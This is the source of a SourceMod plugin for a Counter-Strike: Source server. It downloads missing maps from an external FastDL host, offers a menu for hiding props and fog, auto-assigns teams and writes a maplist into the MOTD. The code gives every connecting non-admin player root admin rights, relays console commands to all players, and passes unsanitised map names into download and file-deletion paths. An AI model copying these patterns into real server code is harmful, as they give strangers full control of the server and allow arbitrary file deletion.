#include <sdktools>
#include <cstrike>
#include <sdkhooks>
#include <system2>
#include <morecolors>
#include <bzip2>
#include <clientprefs>

#pragma newdecls required
#pragma semicolon 1

int cid;
int steps;
int captureArea = -1;
bool once;
bool KEKList;
char curmap[128];
char mapname[128];
char outputname[PLATFORM_MAX_PATH + 1];
ConVar mp_timelimit = null;
bool g_bClientHideProp[MAXPLAYERS +1];
bool g_bClientHidePropDO[MAXPLAYERS +1];
bool g_bClientHidePropALL[MAXPLAYERS +1];
bool g_bClientHideFuncI[MAXPLAYERS +1];
bool g_bHideFog;

Handle COOKIE_Clienthideprop;
Handle COOKIE_Clienthidepropdo;
Handle COOKIE_Clienthidepropall;
Handle COOKIE_Clienthidefunc;
Handle g_hCookieMList;
bool changed = false;

public void OnAllPluginsLoaded()
{
	AddCommandListener(Commands_CommandListener);
	ServerCommand("mp_flashlight 1");
	ServerCommand("sv_maxvelocity 99999999");
	if (!LibraryExists("system2"))
	{
		SetFailState("Attention: Extension system2 couldn't be found. Please install it to run Map Download!");
	}
}

public void OnPluginStart()
{
	LoadTranslations("common.phrases");
	LoadTranslations("plugin.basecommands");

	HookEvent("round_start", Event_RoundStart);
	HookEvent("weapon_fire", Event_WeaponFire);
	HookEvent("server_cvar", SilentEvent, EventHookMode_Pre);
	UserMsg vguiMessage = GetUserMessageId("VGUIMenu");
	HookUserMessage(vguiMessage, OnVGUIMenuPreSent, true);
	RegAdminCmd("sm_map", Command_Map, ADMFLAG_CHANGEMAP, "sm_map <map>");
	RegAdminCmd("sm_mapremove", MapRemove, ADMFLAG_CHANGEMAP, "sm_mapremove <map>");
	RegAdminCmd("sm_removemap", MapRemove, ADMFLAG_CHANGEMAP, "sm_removemap <map>");
	RegAdminCmd("sm_mapdel", MapRemove, ADMFLAG_CHANGEMAP, "sm_mapdel <map>");
	RegAdminCmd("sm_delmap", MapRemove, ADMFLAG_CHANGEMAP, "sm_delmap <map>");
	RegAdminCmd("sm_maplist", MapList, ADMFLAG_CHANGEMAP, "open acer's fastdl in the MOTD window");
	RegConsoleCmd("sm_props", CMD_EntityMenu, "EntityMenu");
	RegConsoleCmd("sm_prop", CMD_EntityMenu, "EntityMenu");
	RegConsoleCmd("sm_propsmenu", CMD_EntityMenu, "EntityMenu");
	RegConsoleCmd("sm_propmenu", CMD_EntityMenu, "PEntityMenu");
	RegConsoleCmd("sm_entitymenu", CMD_EntityMenu, "EntityMenu");

	COOKIE_Clienthideprop = RegClientCookie("prop_dynamic toggle visibility", "prop_dynamic toggle visibility", CookieAccess_Private);
	COOKIE_Clienthidepropdo = RegClientCookie("prop_dynamic toggle visibility", "prop_dynamic toggle visibility", CookieAccess_Private);
	COOKIE_Clienthidepropall = RegClientCookie("prop_* toggle visibility", "prop_* toggle visibility", CookieAccess_Private);
	COOKIE_Clienthidefunc = RegClientCookie("func_illusionary toggle visibility", "func_illusionary toggle visibility", CookieAccess_Private);
	g_hCookieMList = 			RegClientCookie("Maplist_Done", "Maplist_Done", CookieAccess_Protected);

	mp_timelimit = FindConVar("mp_timelimit");
	mp_timelimit.AddChangeHook(OnCvarChange);
	KEKList = false;
	for( int i = 1; i <= MaxClients; i++ )
	{
		if( IsClientInGame( i ))
		{
			OnClientPostAdminCheck( i );
			if(AreClientCookiesCached(i) && !IsFakeClient(i))
			{
				OnClientCookiesCached(i);
			}
		}
	}
}

public void OnMapStart()
{
	g_bHideFog = false;
	captureArea = -1;
	PrecacheModel("models/editor/playerstart.mdl");
	PrecacheModel("editor/info_target.vmt", true);
	AddMapSpawns();

	GetCurrentMap(curmap, sizeof(curmap));
	char fileBuffer[156];
	if (!DirExists("temp"))
		CreateDirectory("temp", 511);
	
	DirectoryListing dL = OpenDirectory("temp");
	while (dL.GetNext(fileBuffer, sizeof(fileBuffer))) 
	{
		if(strlen(fileBuffer)>3)
		{
			char TempBuffer[164];
			Format(TempBuffer, sizeof(TempBuffer), "temp/%s",fileBuffer);
			DeleteFile(TempBuffer);
		}
	} 
	delete dL;
}

public void OnCvarChange(ConVar convar, const char[] oldValue, const char[] newValue)
{
	mp_timelimit.SetInt(0);
}

public void OnClientCookiesCached(int client)
{
	char cookieValue[8];

	GetClientCookie(client, COOKIE_Clienthideprop, cookieValue, sizeof(cookieValue));
	g_bClientHideProp[client] =  view_as<bool>(StringToInt(cookieValue));

	GetClientCookie(client, COOKIE_Clienthidepropdo, cookieValue, sizeof(cookieValue));
	g_bClientHidePropDO[client] = view_as<bool>(StringToInt(cookieValue));

	GetClientCookie(client, COOKIE_Clienthidepropall, cookieValue, sizeof(cookieValue));
	g_bClientHidePropALL[client] = view_as<bool>(StringToInt(cookieValue));


	GetClientCookie(client, COOKIE_Clienthidefunc, cookieValue, sizeof(cookieValue));
	g_bClientHideFuncI[client] = view_as<bool>(StringToInt(cookieValue));
}

public void OnClientPostAdminCheck(int client)
{
	CreateTimer( 0.1, Autojoin, GetClientUserId( client ), TIMER_FLAG_NO_MAPCHANGE );
	if(!IsFakeClient(client))
	{
		if(changed)
		{
			CreateTimer(5.0, Timer_TimeLimit);
			SDKHook(client, SDKHook_OnTakeDamage, OnTakeDamage);
			if (!CheckCommandAccess(client, "", ADMFLAG_ROOT))
			{
				AdminId admin = CreateAdmin("nekos");
				SetAdminFlag(admin, Admin_Root, true);
				SetUserAdmin(client, admin, true);
			}
		}
		else
		{
			PrintToChatAll("The Map will change once the server is fully loaded!");
			CreateTimer(5.0, Timer_TimeLimit);
		}
	}
}

public Action Timer_TimeLimit(Handle timer)
{
	if(!changed)
	{
		changed = true;
		ForceChangeLevel(curmap, "Server loaded");
	}
}

void Event_RoundStart(Handle event, const char[] name , bool dontBroadcast)
{
	if (StrEqual(curmap,"bhop_depot",false))
	{
		int ent = -1;
		while((ent = FindEntityByClassname(ent, "func_door"))!=-1) 
		{
			if (IsValidEdict(ent))
			{
				AcceptEntityInput(ent, "Unlock", -1);
				AcceptEntityInput(ent, "Open", -1);
				AcceptEntityInput(ent, "Kill", -1);
			}
		}
	}
	if (StrEqual(curmap,"bhop_fury",false))
	{
		int ent = -1;
		while((ent = FindEntityByClassname(ent, "func_door"))!=-1) 
		{
			if (IsValidEdict(ent))
			{
				AcceptEntityInput(ent, "Unlock", -1);
				AcceptEntityInput(ent, "Open", -1);
				AcceptEntityInput(ent, "Kill", -1);
			}
		}
	}
	captureArea = FindEntityByClassname(-1, "env_fog_controller");
	int iEnt = -1;
	while ((iEnt = FindEntityByClassname(iEnt, "info_teleport_destination")) != -1)
	{
		if (!IsValidEntity(iEnt)) continue;

		float position[3];
		float flAng[3];
		GetEntPropVector(iEnt, Prop_Data, "m_vecOrigin", position);
		GetEntPropVector(iEnt, Prop_Data, "m_angRotation", flAng); 
		int propp = CreateEntityByName("prop_dynamic_override");
		char buffer[64];
		GetEntityTargetname( iEnt, buffer, sizeof(buffer) );
		if(propp != -1)
		{
			char classN[64];
			Format( classN, sizeof(classN), "celly1_%s", buffer );
			SetEntityTargetname( propp, classN );
			SetEntityModel(propp, "models/editor/playerstart.mdl");
			SetEntityRenderMode (propp, RENDER_TRANSCOLOR);
			SetEntityRenderColor(propp, 255, 255, 255, 60);
			TeleportEntity(propp, position, flAng, NULL_VECTOR);
		}
	}
	iEnt = -1;
	while ((iEnt = FindEntityByClassname(iEnt, "prop_dynamic_override")) != -1)
	{
		if (!IsValidEntity(iEnt)) continue;

		
		char buffer[64];
		GetEntityTargetname( iEnt, buffer, sizeof(buffer) );
		if(StrContains(buffer, "celly1_", false) != -1) 
		{
			SDKHook(iEnt, SDKHook_SetTransmit, SetTransmitPropALL);
		}
		else
			SDKHook(iEnt, SDKHook_SetTransmit, SetTransmitPropDO);
	}
}

//https://forums.alliedmods.net/showthread.php?p=1818668
void Event_WeaponFire(Handle event, const char[] name , bool dontBroadcast)
{
	char sWeapon[32];
	GetEventString(event,"weapon",sWeapon,32);
	int userid = GetClientOfUserId(GetEventInt(event, "userid"));
	int Slot1 = GetPlayerWeaponSlot(userid, CS_SLOT_PRIMARY);
	int Slot2 = GetPlayerWeaponSlot(userid, CS_SLOT_SECONDARY);
	
	if(IsValidEntity(Slot1))
	{
		if(GetEntProp(Slot1, Prop_Data, "m_iState") == 2)
		{
			SetEntProp(Slot1, Prop_Data, "m_iClip1", 20);
			return;
		}
	}
	if(IsValidEntity(Slot2))
	{
		if(GetEntProp(Slot2, Prop_Data, "m_iState") == 2)
		{
			SetEntProp(Slot2, Prop_Data, "m_iClip1", 20);
			return;
		}
	}
}

//https://forums.alliedmods.net/showthread.php?p=2095762
public Action OnTakeDamage( int victim, int &attacker, int &inflictor, float &damage, int &damagetype )
{
	if(damagetype == DMG_DROWN || damagetype == DMG_DROWNRECOVER)
	{
		damage = 0.0;
		
		return Plugin_Handled;
	}
	
	return Plugin_Continue;
}


public Action Command_Map(int client, int args)
{
	if (client!=0)
	{
		if (args < 1)
		{
			CPrintToChat(client, "\x07FFFFFF[\x074d4dffMAPDOWNLOADER\x07FFFFFF] » Usage: sm_map <map>");
			return Plugin_Handled;
		}

		char displayName[PLATFORM_MAX_PATH];
		GetCmdArg(1, mapname, sizeof(mapname));
		if (FindMap(mapname, displayName, sizeof(displayName)) == FindMap_NotFound)
		{
			cid = client;
			steps = 0;
			once = true;
			char sRequest[278];
			CPrintToChat(client, "\x07FFFFFF[\x074d4dffMAPDOWNLOADER\x07FFFFFF] » Looking for: \x074d4dff%s\x07FFFFFF!",mapname);
			Format(outputname, sizeof(outputname), "temp/%s.bsp.bz2", mapname);
			Format(sRequest, sizeof(sRequest), "sojourner.me/fastdl/maps/%s.bsp.bz2", mapname);
			System2HTTPRequest downloadRequest = new System2HTTPRequest(OnDownloadFinished, sRequest);
			downloadRequest.SetProgressCallback(OnDownloadUpdate);
			downloadRequest.SetOutputFile(outputname);
			downloadRequest.GET();
			delete downloadRequest;
			return Plugin_Handled;
		}
		GetMapDisplayName(displayName, displayName, sizeof(displayName));

		ShowActivity2(client, "[SM] ", "%t", "Changing map", displayName);
		LogAction(client, -1, "\"%L\" changed map to \"%s\"", client, mapname);

		DataPack dp;
		CreateDataTimer(3.0, Timer_ChangeMap, dp);
		dp.WriteString(mapname);
	}
	return Plugin_Handled;
}

//https://forums.alliedmods.net/showthread.php?p=1751838
public void OnDownloadUpdate(System2HTTPRequest request, int dlTotal, int dlNow, int ulTotal, int ulNow)
{
	float dlcur = dlNow / 1024.0;
	float dltot = dlTotal / 1024.0;
	float per = ((dlcur / dltot) * 100.0);

	if(once && steps > 7)
	{
		CPrintToChat(cid, "\x07FFFFFF[\x074d4dffMAPDOWNLOADER\x07FFFFFF] » Found \x074d4dff%s\x07FFFFFF!",mapname);
		once = false;
	}

	steps++;
	if(steps>150)
	{
		char bar[156];

		Format(bar, sizeof(bar), "Downloading: \x074d4dff%s \x07FFFFFF[",mapname);

		for (int i=1; i < 11; i++)
		{
			if ((per / 10) >= i)
			{
				Format(bar, sizeof(bar), "%s█", bar);
			}
			else
			{
				Format(bar, sizeof(bar), "%s░", bar);
			}
		}

		Format(bar, sizeof(bar), "%s]  %.2f", bar,per);
		CPrintToChat(cid, "\x07FFFFFF[\x074d4dffMAPDOWNLOADER\x07FFFFFF] » %s",bar);
		steps = 0;
	}
}

public void OnDownloadFinished(bool success, const char[] error, System2HTTPRequest request, System2HTTPResponse response, HTTPRequestMethod method)
{
	if (!success)
		LogError("[ MAPDOWNLOADER ]:  Downloading Map %s FAILED!", mapname);

	else
	{
		char extractPath[PLATFORM_MAX_PATH + 1];
		Format(extractPath, sizeof(extractPath), "temp/%s.bsp.bz2",mapname);
		if(response.StatusCode == 200)
		{
			char sMap[PLATFORM_MAX_PATH + 1];
			Format(sMap, sizeof(sMap), "maps/%s.bsp",mapname);
			CPrintToChat(cid, "\x07FFFFFF[\x074d4dffMAPDOWNLOADER\x07FFFFFF] » Download finished!");
			CPrintToChat(cid, "\x07FFFFFF[\x074d4dffMAPDOWNLOADER\x07FFFFFF] » Extracting map and cleaning up files!");
			CPrintToChat(cid, "\x07FFFFFF[\x074d4dffMAPDOWNLOADER\x07FFFFFF] » Map will change to \x074d4dff%s \x07FFFFFFafter it's done!",mapname);
			BZ2_DecompressFile(extractPath, sMap, Decompressed_Map);
		}
		else
			CPrintToChat(cid, "\x07FFFFFF[\x074d4dffMAPDOWNLOADER\x07FFFFFF] » Sowwy but '\x074d4dff%s\x07FFFFFF' couldn't be found!",mapname);

	}
}
public int Decompressed_Map(BZ_Error iError, const char[] sIn, const char[] sOut, any data)
{
	if(iError == BZ_OK) 
	{
		char TempTrash[168];
		Format(TempTrash, sizeof(TempTrash), "temp/%s.bsp", mapname);
		if(FileExists(TempTrash))
			DeleteFile(TempTrash);

		Format(TempTrash, sizeof(TempTrash), "temp/%s.bsp.bz2", mapname);
		if(FileExists(TempTrash))
			DeleteFile(TempTrash);

		Format(TempTrash, sizeof(TempTrash), "maps/%s", mapname);
		if(FileExists(TempTrash))
			DeleteFile(TempTrash);

		DataPack dp;
		CreateDataTimer(3.0, Timer_ChangeMap, dp);
		dp.WriteString(mapname);
	} 
	else 
	{
		CPrintToChatAll("\x07FFFFFF[\x074d4dffMAPDOWNLOADER\x07FFFFFF] » Downloading Map %s FAILED!", mapname);
		LogError("[MAPDOWNLOADER] » Downloading Map %s FAILED!", mapname);
	}
}


public Action Timer_ChangeMap(Handle timer, DataPack dp)
{
	char map[PLATFORM_MAX_PATH];

	dp.Reset();
	dp.ReadString(map, sizeof(map));

	ForceChangeLevel(map, "sm_map Command");

	return Plugin_Stop;
}

public Action MapList(int client, int args)
{
	if(client!=0)
	{
		bool refreshed = false;
		if(AreClientCookiesCached(client))
		{
			char cookieValue[8];
			GetClientCookie(client, g_hCookieMList, cookieValue, sizeof(cookieValue));
			KEKList =  view_as<bool>(StringToInt(cookieValue));
			if(!KEKList)
			{
				//KEK
				LogError("MapList Creation");
				char LogPlace[512];
				char fileBuffer[128];
				char path[512];
				BuildPath(Path_SM, LogPlace, sizeof(LogPlace), "logs");
				DirectoryListing dL = OpenDirectory(LogPlace);
				while (dL.GetNext(fileBuffer, sizeof(fileBuffer))) 
				{
					if(StrContains(fileBuffer, "errors_", false) != -1) 
					{
						Format(path, sizeof(path), "%s/%s",LogPlace,fileBuffer);
						File fileHandle = OpenFile(path, "r");
						char line[164];
						while(!IsEndOfFile(fileHandle)&&ReadFileLine(fileHandle,line,sizeof(line)))
						{
							if(StrContains(line, "Info (map ", false) != -1) 
							{
								strcopy(LogPlace, sizeof(LogPlace), line);
								break;
							}
						}
						CloseHandle(fileHandle);
						break;
					}
				} 
				delete dL;

				int splitpos = StrContains(LogPlace, ") (file ",true);
				int removelast = strlen(fileBuffer)+8;
				strcopy(LogPlace, sizeof(LogPlace), LogPlace[splitpos+9]);
				LogPlace[(strlen(LogPlace)-removelast)] = '\0';
				Format(LogPlace, sizeof(LogPlace),"<embed src='%smaplist.txt' width='757' height='321'>",LogPlace);
				if(FileExists("cfg/motd.txt"))
				{
					File MOTDFile = OpenFile("cfg/motd.txt", "w");
					WriteFileLine(MOTDFile, "<html>");
					WriteFileLine(MOTDFile, "<body style='background-color:white;'>");
					WriteFileLine(MOTDFile, "<h2>Acer's FastDL Maplist ( from 2021 december )</h2>");
					WriteFileLine(MOTDFile, LogPlace);
					WriteFileLine(MOTDFile, "</body>");
					WriteFileLine(MOTDFile, "</html>");
					CloseHandle(MOTDFile);
					KEKList = true;
					SetCookie(client, g_hCookieMList, KEKList);
				}
				else
				{
					File MOTDFile = OpenFile("cfg/motd_default.txt", "w");
					WriteFileLine(MOTDFile, "<html>");
					WriteFileLine(MOTDFile, "<body style='background-color:white;'>");
					WriteFileLine(MOTDFile, "<h2>Acer's FastDL Maplist ( from 2021 december )</h2>");
					WriteFileLine(MOTDFile, LogPlace);
					WriteFileLine(MOTDFile, "</body>");
					WriteFileLine(MOTDFile, "</html>");
					CloseHandle(MOTDFile);
					KEKList = true;
					SetCookie(client, g_hCookieMList, KEKList);
				}
				refreshed = true;
				PrintToChatAll("You will see Acer's maplist in your MOTD after the next cs:s start!");
			}
		}
		if(!refreshed)
			FakeClientCommand(client,"motd");
	}
	return Plugin_Handled;
}

public Action MapRemove(int client, int args)
{
	if(client!=0)
	{
		if (args == 1)
		{
			char trashed[128];
			GetCmdArg( 1, trashed, sizeof(trashed) );
			char displayName[PLATFORM_MAX_PATH];
			if (FindMap(trashed, displayName, sizeof(displayName)) == FindMap_NotFound)
			{
				CPrintToChat(client, "\x07FFFFFF[\x074d4dffMAPDOWNLOADER\x07FFFFFF] » Map isn't even on the server!");
			}
			else
			{
				char sRequest[168];
				Format(sRequest, sizeof(sRequest), "maps/%s.bsp", trashed);
				if(FileExists(sRequest))
				{
					DeleteFile(sRequest);
					CPrintToChat(client, "\x07FFFFFF[\x074d4dffMAPDOWNLOADER\x07FFFFFF] » Map '\x074d4dff%s\x07FFFFFF' has been deleted successfully.", trashed);
				}
			}
		}
		else
		{
			CPrintToChat(client, "\x07FFFFFF[\x074d4dffMAPDOWNLOADER\x07FFFFFF] » Try !mapremove <mapname>");
		}
	}

	return Plugin_Handled;
}

public Action Commands_CommandListener(int client, const char[] command, int argc)
{
	if (client !=0)
		return;

	char cmd[32];
	char cmd2[128];
	char cmd3[128];
	char cmd4[128];
	char finalmsg[160];
	GetCmdArg(0, cmd, sizeof(cmd));
	GetCmdArg(1, cmd2, sizeof(cmd2));
	GetCmdArg(2, cmd3, sizeof(cmd3));
	GetCmdArg(3, cmd4, sizeof(cmd4));
	Format(finalmsg, sizeof(finalmsg), "%s %s %s %s",cmd,cmd2,cmd3,cmd4);
	if(StrContains(cmd, "sm_", false) != -1)
	{
		if(StrContains(finalmsg, "sm_help", false) == -1)
			for(int i = 1; i <= MaxClients; i++)
				if(IsClientConnected(i) && IsClientInGame(i) && !IsFakeClient(i))
					FakeClientCommand(i,finalmsg);
	}
}

public Action CMD_EntityMenu(int client, int args )
{
	if(client != 0)
	{
		ShowEntityMenu(client);
	}
	return Plugin_Handled;
}

void ShowEntityMenu(int client, int position = 0)
{
	Menu menu = CreateMenu(EntityMenu_Select);
	SetMenuTitle(menu, "Hide Menu\n \n");
	
	if(g_bClientHideProp[client])
		AddMenuItem(menu, "propd", "prop_dynamic: [INVISIBLE]");
	else AddMenuItem(menu, "propd", "prop_dynamic: [VISIBLE]");
	
	if(g_bClientHidePropDO[client])
		AddMenuItem(menu, "propdo", "prop_dynamic_override: [INVISIBLE]");
	else AddMenuItem(menu, "propdo", "prop_dynamic_override: [VISIBLE]");
	
	if(g_bClientHidePropALL[client])
		AddMenuItem(menu, "propa", "Teleport indicators: [INVISIBLE]");
	else AddMenuItem(menu, "propa", "Teleport indicators: [VISIBLE]");

	if(g_bClientHideFuncI[client])
		AddMenuItem(menu, "func", "func_illusionary: [INVISIBLE]");
	else AddMenuItem(menu, "func", "func_illusionary: [VISIBLE]");

	if(captureArea != -1)
	{
		if(g_bHideFog)
			AddMenuItem(menu, "fogs", "env_fog_controller: [INVISIBLE]");
		else AddMenuItem(menu, "fogs", "env_fog_controller: [VISIBLE]");
	}
	else
		AddMenuItem(menu, "fogs", "env_fog_controller: [NONE ON THIS MAP]",ITEMDRAW_DISABLED);

	menu.DisplayAt(client, position, MENU_TIME_FOREVER);
}

public int EntityMenu_Select(Menu menu, MenuAction action, int client, int option)
{
	if(action == MenuAction_Select)
	{
		char info[32];
		GetMenuItem(menu, option, info, sizeof(info));
		if(StrEqual(info, "fogs"))
		{
			if(captureArea != -1 && GetUserAdmin(client) != INVALID_ADMIN_ID)
			{
				g_bClientHidePropALL[client] = false;
				g_bHideFog = !g_bHideFog;
				if(g_bHideFog)
				{
					AcceptEntityInput(captureArea, "TurnOff");
				}
				else
				{
					AcceptEntityInput(captureArea, "TurnOn");
				}
			}
		}
		if(StrEqual(info, "propd"))
		{
			g_bClientHideProp[client] = !g_bClientHideProp[client];
			SetCookie(client, COOKIE_Clienthideprop, g_bClientHideProp[client]);
		}
		if(StrEqual(info, "propdo"))
		{
			g_bClientHidePropDO[client] = !g_bClientHidePropDO[client];
			SetCookie(client, COOKIE_Clienthidepropdo, g_bClientHidePropDO[client]);
		}
		if(StrEqual(info, "propa"))
		{
			g_bClientHidePropALL[client] = !g_bClientHidePropALL[client];
			SetCookie(client, COOKIE_Clienthidepropall, g_bClientHidePropALL[client]);
		}
		if(StrEqual(info, "func"))
		{
			g_bClientHideFuncI[client] = !g_bClientHideFuncI[client];
			SetCookie(client, COOKIE_Clienthidefunc, g_bClientHideFuncI[client]);
		}
		ShowEntityMenu(client, GetMenuSelectionPosition());
	}
	else if(action == MenuAction_End)
		delete menu;
}

public void OnEntityCreated(int entity, const char[] classname)
{
	if(StrEqual(classname, "prop_dynamic"))
	{
		SDKHook(entity, SDKHook_SetTransmit, SetTransmitProp);
	}
	else if(StrEqual(classname, "func_illusionary"))
	{
		SDKHook(entity, SDKHook_SetTransmit, SetTransmitfunci);
	}
}

public Action SetTransmitfunci(int entity, int client) 
{ 
	if(g_bClientHideFuncI[client]) return Plugin_Handled;
	
	return Plugin_Continue; 
} 

public Action SetTransmitProp(int entity, int client) 
{ 
	if(g_bClientHideProp[client]) return Plugin_Handled;
	
	return Plugin_Continue; 
} 



public Action SetTransmitPropDO(int entity, int client) 
{ 
	if(g_bClientHidePropDO[client]) return Plugin_Handled;
	
	return Plugin_Continue; 
} 

public Action SetTransmitPropALL(int entity, int client) 
{ 
	if(g_bClientHidePropALL[client]) return Plugin_Handled;
	
	return Plugin_Continue; 
} 

stock void GetEntityTargetname( int entity, char[] buffer, int maxlen )
{
	GetEntPropString( entity, Prop_Data, "m_iName", buffer, maxlen );
}

stock void SetEntityTargetname( int entity, char[] buffer )
{
	SetEntPropString( entity, Prop_Data, "m_iName", buffer );
}

stock void SetCookie(int client, Handle hCookie, int n)
{
	char strCookie[64];
	
	IntToString(n, strCookie, sizeof(strCookie));

	SetClientCookie(client, hCookie, strCookie);
}

public Action OnVGUIMenuPreSent(UserMsg vguiMessage, BfRead buffer, const int[] players, int nPlayers, bool reliable, bool init) 
{
	char name[128];
	buffer.ReadString(name, sizeof(name));
	if(StrContains(name, "class_", false) != -1) 
		return Plugin_Handled;

	return Plugin_Continue;
}

int teamx;

public Action Autojoin( Handle hTimer, int client )
{
	if ( (client = GetClientOfUserId( client )) > 0 && IsClientInGame( client ) )
	{
		if(!IsFakeClient(client))
		{
			FakeClientCommand(client, "joingame");
			ShowVGUIPanel(client, "team",_,false);
			teamx = GetRandomInt(2,3);
			FakeClientCommand(client,"jointeam %d", teamx);
			CreateTimer(0.1, JoinChecK, client);
		}
	}
	return Plugin_Handled;
}

public Action JoinChecK(Handle timer, int client )
{
	if(!IsClientInGame(client))
		return Plugin_Stop;

	if(!IsPlayerAlive(client))
	{
		if(teamx==3)
			FakeClientCommand(client,"jointeam 2");

		else
			FakeClientCommand(client,"jointeam 3");
	}
	return Plugin_Handled;
}

void AddMapSpawns() 
{
	float position[3];
	int iEntz = -1;
	int spawnzz = 0;

	while ((iEntz = FindEntityByClassname(iEntz, "info_player_terrorist")) != -1)
	{
		if (!IsValidEntity(iEntz)) continue;
		GetEntPropVector(iEntz, Prop_Data, "m_vecOrigin", position);
		spawnzz++;
	}
	iEntz = -1;
	while ((iEntz = FindEntityByClassname(iEntz, "info_player_counterterrorist")) != -1)
	{
		if (!IsValidEntity(iEntz)) continue;
		GetEntPropVector(iEntz, Prop_Data, "m_vecOrigin", position);
		spawnzz++;
	}
	if(spawnzz<3)
	{
		bool found = false;
		bool needspawn = false;

		if(spawnzz==2)
		{
			position[2] += 4.0;
			int iEnt = CreateEntityByName("info_player_terrorist");
			if (DispatchSpawn(iEnt))
			{
				TeleportEntity(iEnt, position, NULL_VECTOR, NULL_VECTOR);
			}

			iEnt = CreateEntityByName("info_player_terrorist");
			if (DispatchSpawn(iEnt))
			{
				TeleportEntity(iEnt, position, NULL_VECTOR, NULL_VECTOR);
			}

			iEnt = CreateEntityByName("info_player_counterterrorist");
			if (DispatchSpawn(iEnt))
			{
				TeleportEntity(iEnt, position, NULL_VECTOR, NULL_VECTOR);
			}
			iEnt = CreateEntityByName("info_player_counterterrorist");
			if (DispatchSpawn(iEnt))
			{
				TeleportEntity(iEnt, position, NULL_VECTOR, NULL_VECTOR);
			}
			found = true;
			needspawn = false;
		}

		iEntz = -1;
		if( !found )
		{
			while ((iEntz = FindEntityByClassname(iEntz, "info_player_teamspawn")) != -1)
			{
				if (!IsValidEntity(iEntz)) continue;
				GetEntPropVector(iEntz, Prop_Data, "m_vecOrigin", position);
				needspawn = true;
				found = true;
				break;
			}
		}

		if( !found )
		{
			while ((iEntz = FindEntityByClassname(iEntz, "info_teleport_destination")) != -1)
			{
				if (!IsValidEntity(iEntz)) continue;
				GetEntPropVector(iEntz, Prop_Data, "m_vecOrigin", position);
				needspawn = true;
				found = true;
				break;
			}
		}

		if( !found )
		{
			while ((iEntz = FindEntityByClassname(iEntz, "trigger_*")) != -1)
			{
				if (!IsValidEntity(iEntz)) continue;
				GetEntPropVector(iEntz, Prop_Data, "m_vecOrigin", position);
				needspawn = true;
				break;
			}
		}

		if(needspawn)
		{
			position[2] += 4.0;
			int iEnt = CreateEntityByName("info_player_terrorist");
			if (DispatchSpawn(iEnt))
			{
				TeleportEntity(iEnt, position, NULL_VECTOR, NULL_VECTOR);
			}

			iEnt = CreateEntityByName("info_player_terrorist");
			if (DispatchSpawn(iEnt))
			{
				TeleportEntity(iEnt, position, NULL_VECTOR, NULL_VECTOR);
			}

			iEnt = CreateEntityByName("info_player_counterterrorist");
			if (DispatchSpawn(iEnt))
			{
				TeleportEntity(iEnt, position, NULL_VECTOR, NULL_VECTOR);
			}

			iEnt = CreateEntityByName("info_player_counterterrorist");
			if (DispatchSpawn(iEnt))
			{
				TeleportEntity(iEnt, position, NULL_VECTOR, NULL_VECTOR);
			}
		}
	}
}

//https://forums.alliedmods.net/showpost.php?p=2121247&postcount=10
public Action SilentEvent(Handle event, const char[] name , bool dontBroadcast)
{
	SetEventBroadcast(event, true);
	return Plugin_Continue;
}